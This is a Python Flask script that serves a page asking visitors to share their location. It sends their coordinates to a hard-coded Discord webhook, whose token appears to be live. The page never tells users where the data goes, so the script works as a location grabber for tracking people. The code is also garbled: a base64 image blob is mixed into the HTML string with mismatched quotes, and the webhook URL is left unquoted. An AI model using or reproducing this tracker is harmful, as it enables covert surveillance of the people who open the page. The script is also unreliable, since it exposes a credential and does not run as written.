import os
import json
import requests
from flask import Flask, render_template_string, request

# Install necessary packages
try:
    import flask
except ImportError:
    os.system("pip install flask requests")
    import flask

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1457199916337332450/8eoFX1GQUjS9YQyiOF0dIKt0LH0Ldfh4DgScD39iB_8vLMxrKIC00Uwqf6TkyMD3TQCB"  # Replace with your actual Discord webhook URL

HTML_PAGE = "data:image/jpeg;base64,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"
<!DOCTYPE html>
<html>
<head>
    <title>Share Location</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch('/send_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    })
                    .then(response => response.text())
                    .then(data => alert(data))
                    .catch(error => console.error('Error:', error));
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
    </script>
</head>
<body>
    <h1>Share Your Location</h1>
    <button onclick="sendLocation()">Send Location</button>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    if not data or 'latitude' not in data or 'longitude' not in data:
        return "Invalid data", 400

    payload = {
        "content": f"User shared location: Latitude: {data['latitude']}, Longitude: {data['longitude']}"
    }
    
    response = requests.post(https://discord.com/api/webhooks/1457199916337332450/8eoFX1GQUjS9YQyiOF0dIKt0LH0Ldfh4DgScD39iB_8vLMxrKIC00Uwqf6TkyMD3TQCB, json=payload)
    if response.status_code == 204:
        return "Location sent successfully!"
    else:
        return "Failed to send location", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
